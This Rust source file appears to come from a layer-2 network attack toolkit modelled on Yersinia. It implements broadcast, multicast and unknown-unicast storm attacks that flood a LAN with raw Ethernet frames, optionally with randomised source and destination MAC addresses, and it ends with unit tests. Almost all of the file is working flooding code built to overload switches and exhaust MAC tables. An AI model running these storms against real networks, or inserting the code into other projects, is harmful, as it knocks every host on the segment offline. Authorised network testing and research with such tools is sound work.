//! Storm Attack Implementations
use super::packet::{StormConfig, StormPacket};
use async_trait::async_trait;
use rand::Rng;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct BroadcastStormAttack {
    pub config: StormConfig,
}

impl Default for BroadcastStormAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl BroadcastStormAttack {
    pub fn new() -> Self {
        Self {
            config: StormConfig::new(),
        }
    }

    pub fn with_config(mut self, config: StormConfig) -> Self {
        self.config = config;
        self
    }

    pub fn with_rate(mut self, pps: usize) -> Self {
        self.config = self.config.with_rate(pps);
        self
    }

    pub fn with_duration(mut self, seconds: u64) -> Self {
        self.config = self.config.with_duration(seconds);
        self
    }

    pub fn build_packets(&self) -> Vec<StormPacket> {
        let mut packets = Vec::new();
        let mut rng = rand::thread_rng();

        for _ in 0..self.config.total_packets() {
            let mut pkt = StormPacket::broadcast().with_payload_size(self.config.packet_size);

            if self.config.randomize_source {
                let src: [u8; 6] = rng.gen();
                pkt = pkt.with_source(src);
            }

            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct MulticastStormAttack {
    pub config: StormConfig,
    pub multicast_addresses: Vec<[u8; 6]>,
}

impl Default for MulticastStormAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl MulticastStormAttack {
    pub fn new() -> Self {
        Self {
            config: StormConfig::new(),
            multicast_addresses: vec![
                [0x01, 0x00, 0x5E, 0x00, 0x00, 0x01], // 224.0.0.1
                [0x01, 0x00, 0x5E, 0x00, 0x00, 0x02], // 224.0.0.2
                [0x01, 0x00, 0x5E, 0x00, 0x00, 0xFB], // 224.0.0.251 (mDNS)
            ],
        }
    }

    pub fn with_config(mut self, config: StormConfig) -> Self {
        self.config = config;
        self
    }

    pub fn with_addresses(mut self, addresses: Vec<[u8; 6]>) -> Self {
        self.multicast_addresses = addresses;
        self
    }

    pub fn build_packets(&self) -> Vec<StormPacket> {
        let mut packets = Vec::new();
        let mut rng = rand::thread_rng();
        let addr_count = self.multicast_addresses.len();

        for i in 0..self.config.total_packets() {
            let dest_mac = self.multicast_addresses[i % addr_count];

            let mut pkt = StormPacket::multicast().with_payload_size(self.config.packet_size);
            pkt.destination_mac = dest_mac;

            if self.config.randomize_source {
                let src: [u8; 6] = rng.gen();
                pkt = pkt.with_source(src);
            }

            packets.push(pkt);
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct UnknownUnicastStormAttack {
    pub config: StormConfig,
    pub randomize_destination: bool,
}

impl Default for UnknownUnicastStormAttack {
    fn default() -> Self {
        Self::new()
    }
}

impl UnknownUnicastStormAttack {
    pub fn new() -> Self {
        Self {
            config: StormConfig::new(),
            randomize_destination: true,
        }
    }

    pub fn with_config(mut self, config: StormConfig) -> Self {
        self.config = config;
        self
    }

    pub fn with_random_destination(mut self, randomize: bool) -> Self {
        self.randomize_destination = randomize;
        self
    }

    pub fn build_packets(&self) -> Vec<StormPacket> {
        let mut packets = Vec::new();
        let mut rng = rand::thread_rng();

        for _ in 0..self.config.total_packets() {
            let mut pkt = StormPacket::unknown_unicast().with_payload_size(self.config.packet_size);

            if self.randomize_destination {
                // Generate random unicast MAC (LSB of first byte = 0)
                let mut dst: [u8; 6] = rng.gen();
                dst[0] &= 0xFE; // Clear multicast bit
                pkt.destination_mac = dst;
            }

            if self.config.randomize_source {
                let src: [u8; 6] = rng.gen();
                pkt = pkt.with_source(src);
            }

            packets.push(pkt);
        }

        packets
    }
}

#[async_trait]
impl Attack for BroadcastStormAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval =
            Duration::from_micros(1_000_000 / self.config.packets_per_second.max(1) as u64);

        for (idx, storm_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let storm_bytes = storm_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress(storm_pkt.destination_mac),
                MacAddress(storm_pkt.source_mac),
                EtherType::IPv4,
                storm_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 100 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Broadcast Storm"
    }
}

#[async_trait]
impl Attack for MulticastStormAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval =
            Duration::from_micros(1_000_000 / self.config.packets_per_second.max(1) as u64);

        for (idx, storm_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let storm_bytes = storm_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress(storm_pkt.destination_mac),
                MacAddress(storm_pkt.source_mac),
                EtherType::IPv4,
                storm_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 50 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Multicast Storm"
    }
}

#[async_trait]
impl Attack for UnknownUnicastStormAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval =
            Duration::from_micros(1_000_000 / self.config.packets_per_second.max(1) as u64);

        for (idx, storm_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let storm_bytes = storm_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress(storm_pkt.destination_mac),
                MacAddress(storm_pkt.source_mac),
                EtherType::IPv4,
                storm_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 75 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Unknown Unicast Storm"
    }
}

#[cfg(test)]
mod tests {
    use super::super::packet::StormType;
    use super::*;

    #[test]
    fn test_broadcast_storm() {
        let config = StormConfig::new().with_rate(100).with_duration(1);
        let attack = BroadcastStormAttack::new().with_config(config);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 100);
        assert!(packets.iter().all(|p| p.storm_type == StormType::Broadcast));
    }

    #[test]
    fn test_multicast_storm() {
        let config = StormConfig::new().with_rate(50).with_duration(1);
        let attack = MulticastStormAttack::new().with_config(config);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 50);
    }

    #[test]
    fn test_unknown_unicast_storm() {
        let config = StormConfig::new().with_rate(75).with_duration(1);
        let attack = UnknownUnicastStormAttack::new().with_config(config);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 75);
    }

    #[test]
    fn test_randomized_source() {
        let config = StormConfig::new()
            .with_rate(10)
            .with_duration(1)
            .with_randomized_source();
        let attack = BroadcastStormAttack::new().with_config(config);
        let packets = attack.build_packets();

        // Check that source MACs are different (with high probability)
        let first_src = packets[0].source_mac;
        let has_different = packets.iter().any(|p| p.source_mac != first_src);
        assert!(has_different);
    }
}
